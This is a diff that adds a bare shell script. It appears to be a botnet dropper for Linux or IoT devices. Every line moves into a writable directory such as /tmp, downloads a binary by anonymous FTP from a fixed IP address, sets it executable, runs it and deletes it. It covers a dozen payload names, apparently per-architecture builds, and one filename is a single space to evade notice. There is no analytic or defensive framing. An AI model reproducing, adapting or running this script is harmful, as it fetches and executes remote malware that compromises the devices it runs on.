@@ -1,0 +1,13 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 140.143.183.193 ntpg ntpg; chmod 777 ntpg ./ntpg; rm -rf ntpg
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 140.143.183.193 ssdf ssdf; chmod 777 ssdf ./ssdf; rm -rf ssdf
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 140.143.183.193 odsh odsh; chmod 777 odsh ./odsh; rm -rf odsh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 140.143.183.193 balls balls; chmod 777 balls ./balls; rm -rf balls
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 140.143.183.193 franks franks; chmod 777 franks ./franks; rm -rf franks
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 140.143.183.193 squid squid; chmod 777 squid ./squid; rm -rf squid
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 140.143.183.193 croc croc; chmod 777 croc ./croc; rm -rf croc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 140.143.183.193 ftc ftc; chmod 777 ftc ./ftc; rm -rf ftc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 140.143.183.193 pfyp pfyp; chmod 777 pfyp ./pfyp; rm -rf pfyp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 140.143.183.193 sh3 sh3; chmod 777 sh3 ./sh3; rm -rf sh3
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 140.143.183.193 ' ' ' '; chmod 777 ' ' ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 140.143.183.193 apac apac; chmod 777 apac ./apac; rm -rf apac
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 140.143.183.193 tel tel; chmod 777 tel ./tel; rm -rf tel
